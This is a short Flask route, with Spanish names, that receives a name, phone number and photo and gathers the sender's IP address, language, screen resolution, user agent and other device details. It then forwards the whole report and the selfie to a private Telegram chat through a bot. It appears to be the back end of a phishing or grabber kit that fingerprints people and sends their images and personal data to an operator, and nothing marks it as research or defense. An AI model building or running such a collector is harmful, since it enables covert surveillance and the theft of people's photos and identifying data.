@app.route('/enviar', methods=['POST'])
def enviar():
    try:
        nombre = request.form.get('nombre')
        telefono = request.form.get('telefono')
        foto = request.files.get('foto')

        fecha = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

        reporte = (
            "┏━━━━━━━━━━━━━━━━━━━━━━┑\n"
            "┣► 📸 Selfie tomada\n"
            f"┣► 👤 Usuario: {nombre}\n"
            f"┣► 📱 Teléfono: {telefono}\n"
            f"┣► 🕒 Fecha: {fecha}\n"
            f"┣► 🌐 IP: {request.remote_addr}\n"
            f"┣► 📺 Resolución: {request.form.get('resolucion')}\n"
            f"┣► 🌎 Idioma: {request.form.get('idioma')}\n"
            f"┣► 📡 Estado: {request.form.get('online')}\n"
            f"┣► 🌙 Modo oscuro: {request.form.get('dark')}\n"
            f"┣► ✋ Touch: {request.form.get('touch')}\n"
            "┣► 🧠 UserAgent:\n"
            f"{request.form.get('useragent')}\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━┙"
        )

        if foto:
            bot.send_photo(MI_ID, foto, caption=reporte)
        else:
            bot.send_message(MI_ID, reporte)

        return jsonify({"ok": True})

    except Exception as e:
        return jsonify({"error": str(e)})